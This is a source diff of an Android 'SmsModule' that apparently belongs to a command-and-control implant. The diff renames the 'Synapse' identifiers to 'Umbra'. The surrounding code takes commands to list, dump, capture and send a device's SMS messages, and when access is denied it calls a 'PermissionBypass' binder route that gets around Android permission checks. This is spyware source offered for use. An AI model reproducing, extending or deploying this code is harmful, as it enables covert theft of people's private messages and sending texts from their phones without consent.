@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.net.Uri
@@ -6,9 +6,9 @@ import android.os.Binder
 import android.os.Parcel
 import android.provider.Telephony
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SmsMessage
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.SmsMessage
+import org.umbra.core.core.UmbraResponse
 import java.lang.reflect.Method
 
 object SmsModule {
@@ -17,12 +17,12 @@ object SmsModule {
     private val SMS_INBOX_URI: Uri = Uri.parse("content://sms/inbox")
     private val SMS_SENT_URI: Uri = Uri.parse("content://sms/sent")
 
-    suspend fun list(context: Context, cmd: Command): SynapseResponse {
+    suspend fun list(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(500)
         return querySms(context, SMS_URI, null, count)
     }
 
-    suspend fun read(context: Context, cmd: Command): SynapseResponse {
+    suspend fun read(context: Context, cmd: Command): UmbraResponse {
         val threadId = cmd.params["thread_id"]
         val address = cmd.params["address"]
         val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(200)
@@ -41,7 +41,7 @@ object SmsModule {
         return querySms(context, SMS_URI, selection, count, selArgs)
     }
 
-    suspend fun dump(context: Context, cmd: Command): SynapseResponse {
+    suspend fun dump(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 500).coerceAtMost(2000)
         val folder = cmd.params["folder"] ?: "all"
 
@@ -61,11 +61,11 @@ object SmsModule {
      *
      * Also attempts ISmsService binder direct send as a fallback.
      */
-    suspend fun send(context: Context, cmd: Command): SynapseResponse {
+    suspend fun send(context: Context, cmd: Command): UmbraResponse {
         val destination = cmd.params["to"] ?: cmd.params["destination"] ?: cmd.params["number"]
-            ?: return SynapseResponse.ErrorResponse("sms:missing_destination", "sms")
+            ?: return UmbraResponse.ErrorResponse("sms:missing_destination", "sms")
         val message = cmd.params["message"] ?: cmd.params["body"] ?: cmd.params["text"]
-            ?: return SynapseResponse.ErrorResponse("sms:missing_message", "sms")
+            ?: return UmbraResponse.ErrorResponse("sms:missing_message", "sms")
 
         val results = mutableMapOf<String, String>()
         var success = false
@@ -122,7 +122,7 @@ object SmsModule {
             }
         } catch (e: Exception) {
             results["smsmanager"] = "reflection_failed: ${e.message}"
-            Log.d("Synapse.SMS", "SmsManager reflection failed: ${e.message}")
+            Log.d("Umbra.SMS", "SmsManager reflection failed: ${e.message}")
         }
 
         // ── Route 2: ISmsService binder direct ──
@@ -166,7 +166,7 @@ object SmsModule {
             }
         }
 
-        return SynapseResponse.SmsSendResponse(
+        return UmbraResponse.SmsSendResponse(
             success = success,
             destination = destination,
             message = message.take(100),
@@ -236,7 +236,7 @@ object SmsModule {
      * Capture outgoing SMS by hooking into the SMS ContentProvider sent folder.
      * Also tries to intercept via ISmsService.
      */
-    suspend fun capture(context: Context, cmd: Command): SynapseResponse {
+    suspend fun capture(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(200)
         val includeInbox = cmd.params["include_inbox"]?.toBoolean() ?: false
 
@@ -267,16 +267,16 @@ object SmsModule {
             }
         } catch (e: Exception) {
             // ── Binder bypass fallback ──
-            Log.d("Synapse.SMS", "Capture: ContentResolver denied, trying binder bypass...")
+            Log.d("Umbra.SMS", "Capture: ContentResolver denied, trying binder bypass...")
             return try {
                 val messages = PermissionBypass.readSmsViaBinder(context, selection = null, limit = count)
                 if (messages.isNotEmpty()) {
-                    SynapseResponse.SmsListResponse(messages = messages, count = messages.size)
+                    UmbraResponse.SmsListResponse(messages = messages, count = messages.size)
                 } else {
-                    SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
+                    UmbraResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
                 }
             } catch (bp: Exception) {
-                SynapseResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
+                UmbraResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
             }
         }
 
@@ -307,7 +307,7 @@ object SmsModule {
             } catch (_: SecurityException) {}
         }
 
-        return SynapseResponse.SmsListResponse(
+        return UmbraResponse.SmsListResponse(
             messages = messages,
             count = messages.size
         )
@@ -316,7 +316,7 @@ object SmsModule {
     private fun querySms(
         context: Context, uri: Uri, selection: String?, limit: Int,
         selArgs: Array<String>? = null
-    ): SynapseResponse {
+    ): UmbraResponse {
         try {
             val messages = mutableListOf<SmsMessage>()
             val cursor = context.contentResolver.query(
@@ -356,26 +356,26 @@ object SmsModule {
                 }
             }
 
-            return SynapseResponse.SmsListResponse(
+            return UmbraResponse.SmsListResponse(
                 messages = messages,
                 count = messages.size
             )
         } catch (e: Exception) {
             // ── Binder bypass fallback: use ISmsService / IContentProvider directly ──
-            Log.d("Synapse.SMS", "ContentResolver denied, trying binder bypass...")
+            Log.d("Umbra.SMS", "ContentResolver denied, trying binder bypass...")
             return try {
                 val messages = PermissionBypass.readSmsViaBinder(context, selection = selection, selArgs = selArgs, limit = limit)
                 if (messages.isNotEmpty()) {
-                    Log.d("Synapse.SMS", "Binder bypass success: ${messages.size} SMS")
-                    SynapseResponse.SmsListResponse(messages = messages, count = messages.size)
+                    Log.d("Umbra.SMS", "Binder bypass success: ${messages.size} SMS")
+                    UmbraResponse.SmsListResponse(messages = messages, count = messages.size)
                 } else {
-                    SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
+                    UmbraResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
                 }
             } catch (bp: Exception) {
-                SynapseResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
+                UmbraResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
             }
         } catch (e: Exception) {
-            return SynapseResponse.ErrorResponse("sms:${e.message}", "sms")
+            return UmbraResponse.ErrorResponse("sms:${e.message}", "sms")
         }
     }
 }
